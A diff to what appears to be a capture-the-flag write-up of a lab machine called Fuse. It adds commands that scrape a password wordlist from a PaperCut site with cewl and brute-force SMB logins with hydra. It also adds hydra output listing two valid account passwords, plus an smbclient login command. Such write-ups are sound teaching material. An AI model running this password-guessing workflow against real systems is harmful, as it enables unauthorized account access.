@@ -48,5 +48,13 @@ Host script results:
 We explore the site at http://10.10.10.193 but are instead redirected to PaperCutPrint Site at http://fuse.fabricorp.local/papercut/logs/html/index.htm.
 We add the site to /etc/hosts. Clicking around a bit we can see potential usernames like: pmerton, tlavel, sthompson, bhult and administrator and we add this
 to a file.
-We run cewl against the site to gather potential passwords.
-We then test login using rpcclient as follows : 
+We run cewl against the site to gather potential passwords : cewl -w pwd.txt --with-numbers http://fuse.fabricorp.local/papercut/logs/html/index.htm
+We then test hits using hydra as follows : hydra -L users -P pwd.txt 10.10.10.193 smb
+
+[445][smb] Host: 10.10.10.193 Account: tlavel Valid password, password expired and must be changed on next logon
+[445][smb] host: 10.10.10.193 login: tlavel   password: Fabricorp01
+[445][smb] Host: 10.10.10.193 Account: bhult Valid password, password expired and must be changed on next logon
+[445][smb] host: 10.10.10.193 login: bhult   password: Fabricorp01
+
+Test login using smbclient as: smbclient -L 10.10.10.193 -U tlavel
+
